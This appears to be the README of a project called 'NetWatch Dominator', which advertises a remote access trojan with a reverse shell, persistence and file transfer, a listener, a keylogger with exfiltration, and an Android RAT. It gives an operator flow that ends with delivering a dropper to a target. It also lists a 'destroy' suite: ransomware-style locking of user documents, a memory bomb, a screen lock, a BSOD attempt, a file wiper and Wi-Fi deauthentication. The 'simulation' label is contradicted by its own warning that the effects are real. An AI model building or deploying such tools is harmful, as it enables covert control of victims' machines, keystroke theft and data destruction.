# NetWatch Dominator — Real Control Layer

Live device monitor + permanent ban + **real remote control RAT** + destroy simulation suite.

## Real Virus Control (CONTROL tab)

| Payload | What it does |
|---------|----------------|
| **FULL RAT** | Interactive reverse shell with length-prefixed protocol. Commands: `shell`, `cd`, `pwd`, `ls`, `get`, `put`, `screenshot`, `ps`, `persist`, `sysinfo`, `kill`. Auto-persistence (registry + startup on Windows, cron/systemd on Linux). |
| **LISTENER** | Operator-side multi-session listener. Run this first, then deploy FULL RAT with matching LHOST/LPORT. |
| **KEYLOGGER** | Real pynput keylogger with optional exfil. |
| **ANDROID RAT** | Socket control surface for APK (shell, sms/contacts/location/cam stubs ready for pyjnius binding). |

### Operator flow
1. Generate **LISTENER** → run `python control_listener.py`
2. Set LHOST to your IP, generate **FULL RAT** + dropper
3. Deliver dropper to target
4. Session lands in listener: `rat> shell whoami` etc.

## Real Malware Simulation (DESTROY tab)

| Payload | What it does |
|---------|----------------|
| **FULL DESTROY** | Parallel: memory bomb + CPU melt + popup storm + ransomware-style XOR lock on user docs + screen lock (blocks Alt-F4). Optional Windows BSOD attempt. |
| **WIPER SIM** | Truncates + renames user files (Desktop/Documents/Downloads/Pictures). Recoverable. |
| **ANDROID DESTROY** | Input event spam loop for APK packaging. |

These are **simulations** that still produce real visible/resource impact on a machine that runs them. Treat as live malware in a lab.

## Network features
Live ARP discovery, history, permanent MAC ban/unban, port scan, deauth, export, dark UI.

## Build
```bash
pip install -r requirements.txt
python main.py
python build_exe.py   # → dist/NetWatchDominator.exe
```

Figma: https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe  
Repo: https://github.com/someone405-ship-it/netwatch-dominator
